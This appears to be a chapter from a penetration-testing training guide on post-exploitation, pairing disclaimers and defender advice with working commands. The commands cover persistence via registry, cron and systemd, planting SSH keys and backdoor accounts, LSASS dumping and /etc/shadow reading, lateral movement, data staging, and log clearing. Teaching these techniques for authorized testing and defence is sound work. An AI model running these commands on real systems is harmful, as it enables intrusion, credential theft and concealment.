CHAPTER 05

Post-Exploitation

Lateral movement, persistence mechanisms, and data collection strategies

⚠️ CRITICAL DISCLAIMER

Post-exploitation techniques must ONLY be used with explicit authorization. These methods are described for educational and defensive purposes to help security teams understand attacker behavior and improve defenses.

🎯 Understanding Post-Exploitation

Post-exploitation is the phase after gaining initial access where attackers expand their control, establish persistence, and achieve their ultimate objectives. Understanding these techniques is crucial for defenders to detect and prevent advanced attacks.

Post-Exploitation Objectives

  • Maintain Access: Establish persistence mechanisms
  • Escalate Privileges: Obtain higher-level access
  • Expand Reach: Move laterally to other systems
  • Gather Intelligence: Collect sensitive data and credentials
  • Cover Tracks: Remove evidence of compromise
  • Assess Impact: Demonstrate potential damage

The Kill Chain - Post-Exploitation Phase

CYBER KILL CHAIN (Lockheed Martin):

1. Reconnaissance        ← Pre-exploitation
2. Weaponization         ← Pre-exploitation
3. Delivery              ← Pre-exploitation
4. Exploitation          ← Initial access
5. Installation          ← POST-EXPLOITATION ✓
6. Command & Control     ← POST-EXPLOITATION ✓
7. Actions on Objectives ← POST-EXPLOITATION ✓

POST-EXPLOITATION WORKFLOW:

🔄 Establishing Persistence

Persistence mechanisms ensure continued access even after system reboots or credential changes:

Windows Persistence Techniques

Technique Method Detectability
Registry Run Keys HKLM/HKCU\Software\Microsoft\Windows\CurrentVersion\Run Medium
Scheduled Tasks Create task to run payload periodically Medium
Service Creation Install malicious Windows service Medium-High
WMI Event Subscription Create WMI event consumer Low
DLL Hijacking Place malicious DLL in search path Low
Startup Folder Place executable in startup directory High

Registry Persistence Example (Conceptual)

# Add to registry run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
  /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# Scheduled task creation
schtasks /create /tn "Windows Update Check" /tr "C:\path\to\payload.exe" ^
  /sc onlogon /ru System

# WMI Event Subscription (more stealthy)
# Creates event filter that triggers on user logon
# Executes payload via CommandLineEventConsumer

Linux Persistence Techniques

Technique Method Location
Cron Jobs Schedule periodic execution /etc/crontab, /var/spool/cron/
SSH Keys Add attacker's public key ~/.ssh/authorized_keys
Systemd Service Create malicious service /etc/systemd/system/
RC Scripts Modify startup scripts /etc/rc.local, /etc/init.d/
Bashrc/Profile Add commands to shell startup ~/.bashrc, ~/.profile
LD_PRELOAD Library injection /etc/ld.so.preload

Linux Persistence Examples (Conceptual)

# Add SSH key for persistent access
echo "ssh-rsa AAAA[...attacker's public key...]" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Cron job (every hour)
echo "0 * * * * /tmp/.hidden/backdoor.sh" >> /var/spool/cron/root

# Systemd service
cat > /etc/systemd/system/update-checker.service << EOF
[Unit]
Description=System Update Checker
[Service]
Type=simple
ExecStart=/opt/scripts/checker.sh
Restart=always
[Install]
WantedBy=multi-user.target
EOF

systemctl enable update-checker.service
systemctl start update-checker.service

# Backdoor user account
useradd -M -s /bin/bash -G sudo backdoor
echo "backdoor:P@ssw0rd123" | chpasswd

⚠️ Testing Guidelines

When testing persistence mechanisms:

  • Document all persistence mechanisms created
  • Ensure complete removal during cleanup
  • Verify with client before creating backdoor accounts
  • Use distinctive names for easy identification
  • Never use techniques that could harm system stability

🔐 Credential Harvesting

Collecting credentials is often the key to lateral movement and privilege escalation:

Windows Credential Extraction

Tool/Method Targets Requirements
Mimikatz LSASS memory, SAM, cached credentials Administrator/SYSTEM access
LSASS Dump Process memory containing credentials Administrator access
SAM Database Local password hashes SYSTEM access
NTDS.dit Active Directory database Domain Controller access
Credential Manager Saved credentials User context
Browser Passwords Saved browser credentials User context

Credential Harvesting Concepts

# LSASS memory dump (requires admin)
# Creates dump file of LSASS process memory
# Can be analyzed offline with Mimikatz

rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump ^
  [LSASS_PID] C:\temp\lsass.dmp full

# Extract from Credential Manager
cmdkey /list

# PowerShell credential extraction
# (Requires appropriate privileges)
Get-WmiObject -Class Win32_Process -Filter "Name='lsass.exe'"

# Note: These techniques require proper authorization
# and should only be used in approved security assessments

Linux Credential Harvesting

# Password hash extraction
cat /etc/shadow              # Requires root access

# SSH private keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null

# Bash history (may contain passwords)
cat ~/.bash_history
cat /home/*/.bash_history

# Configuration files with credentials
grep -r "password" /etc/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# Environment variables
env | grep -i pass
cat /proc/*/environ | tr '\0' '\n' | grep -i pass

# Database credentials
cat /var/www/html/config.php
cat /etc/mysql/my.cnf

↔️ Lateral Movement

Moving from the initially compromised system to other systems in the network:

Lateral Movement Techniques

Technique Description Tools
Pass-the-Hash Use NTLM hash without knowing plaintext password Mimikatz, CrackMapExec, Impacket
Pass-the-Ticket Use Kerberos tickets for authentication Mimikatz, Rubeus
RDP Hijacking Attach to existing RDP sessions Built-in Windows tools
PSExec Execute commands on remote systems PsExec, Impacket, Metasploit
WMI Windows Management Instrumentation wmic, PowerShell, CrackMapExec
PowerShell Remoting Remote PowerShell execution PowerShell, Evil-WinRM

Lateral Movement Examples (Conceptual)

# PSExec execution
psexec.py domain/user:password@target.com "whoami"

# WMI command execution
wmic /node:target.com /user:domain\user /password:pass ^
  process call create "cmd.exe /c commands"

# PowerShell remoting
Enter-PSSession -ComputerName target.com -Credential domain\user

# SMB file copy and execution
copy payload.exe \\target\C$\Windows\Temp\
sc \\target create backdoor binpath= "C:\Windows\Temp\payload.exe"
sc \\target start backdoor

# Pass-the-Hash concept
# Using NTLM hash instead of password
# Requires appropriate tools and privileges

Active Directory Exploitation

Common AD Attack Paths

  • Kerberoasting: Request service tickets and crack offline
  • AS-REP Roasting: Target accounts without Kerberos pre-auth
  • Golden Ticket: Forge TGT with KRBTGT hash
  • Silver Ticket: Forge service tickets
  • DCSync: Replicate domain credentials from DC
  • LLMNR/NBT-NS Poisoning: Intercept authentication attempts
# AD Reconnaissance
# Enumerate domain users, groups, computers

# BloodHound - Visualize AD attack paths
# Identifies shortest path to Domain Admin

# Find Domain Admins
net group "Domain Admins" /domain

# Find Domain Controllers
nltest /dclist:domain.com

# Enumerate trusts
nltest /domain_trusts

📦 Data Collection and Staging

Identifying, collecting, and preparing sensitive data for demonstration purposes:

Data Discovery

Data Type Search Strategy Example Locations
Credentials Search for password files, configs Config files, scripts, documents
Intellectual Property Look for proprietary documents File servers, SharePoint, email
Personal Data (PII) Database queries, file searches Databases, CRM systems, HR files
Financial Data Target accounting systems Financial databases, spreadsheets
Source Code Git repositories, dev servers Version control, development systems

Data Search Commands

# Windows file search
dir /s /b C:\*password*.txt
dir /s /b C:\*confidential*.*
dir /s /b C:\*.xlsx | findstr /i "finance salary budget"

# PowerShell recursive search
Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.doc,*.xlsx ^
  | Select-String -Pattern "password|confidential|secret"

# Linux file search
find / -name "*password*" 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
locate credentials.txt

# Database queries (example)
SELECT * FROM users WHERE role = 'admin';
SELECT table_name FROM information_schema.tables;

Data Staging and Preparation

# Create staging directory
mkdir C:\Windows\Temp\.staging

# Copy interesting files
xcopy C:\Users\*\Documents\*.xlsx C:\Windows\Temp\.staging /s

# Compress data
tar -czf collected_data.tar.gz /path/to/data
# or on Windows:
Compress-Archive -Path .\staging\* -DestinationPath collected.zip

# Encrypt (if needed)
# Use appropriate encryption tools
# GPG, 7zip with password, etc.

⚠️ Data Handling Ethics

CRITICAL: During authorized penetration tests:

  • Only collect minimal data needed to prove impact
  • Never exfiltrate actual sensitive data
  • Use file hashes or screenshots as evidence
  • Immediately delete any accidentally collected PII
  • Report data exposure risks to client immediately
  • Treat all client data as highly confidential

🔇 Covering Tracks

Understanding how attackers hide their activities helps defenders know what to look for:

Log Manipulation

Platform Log Location Clearing Method
Windows Event Logs C:\Windows\System32\winevt\Logs\ wevtutil cl System/Security/Application
Linux Syslog /var/log/syslog, /var/log/messages Selective deletion, log rotation
Linux Auth Log /var/log/auth.log, /var/log/secure sed, awk to remove entries
Web Server Logs /var/log/apache2/, /var/log/nginx/ Delete or modify access logs
Bash History ~/.bash_history Clear or disable history

Track Covering Techniques (For Detection)

# Windows - Clear event logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux - Disable command history
unset HISTFILE
export HISTSIZE=0

# Clear bash history
cat /dev/null > ~/.bash_history
history -c

# Remove specific entries
history -d [line_number]

# Timestomp (change file timestamps)
# Modify MAC (Modified, Accessed, Created) times
# Makes files appear older or not recently accessed

# Note: Modern logging and SIEM systems
# make complete track covering very difficult
# Defenders should implement:
# - Centralized logging
# - Log integrity monitoring
# - Immutable log storage
# - Real-time alerting

Anti-Forensics Awareness

Defender's Perspective

Understanding track-covering helps implement better detection:

  • Forward logs to SIEM in real-time
  • Implement file integrity monitoring (FIM)
  • Use write-once log storage
  • Monitor for log clearing events
  • Baseline normal administrative behavior
  • Alert on unusual log gaps or deletions
  • Maintain offline backups of critical logs

📊 Post-Exploitation Reporting

Documenting post-exploitation findings effectively:

Key Report Elements

  • Access Level Achieved: Initial and escalated privileges
  • Persistence Mechanisms: Methods that could allow return access
  • Lateral Movement: Systems accessed beyond initial compromise
  • Data Accessed: Types and sensitivity of accessible data
  • Detection Evasion: Which security controls were bypassed
  • Business Impact: Real-world consequences of the access
  • Remediation Steps: Specific actions to prevent recurrence

Evidence Collection Best Practices

  • Screenshot command outputs with timestamps
  • Document every step of the attack path
  • Collect file hashes instead of actual files when possible
  • Note detection/prevention tools encountered
  • Record cleanup activities performed
  • Maintain chain of custody for evidence
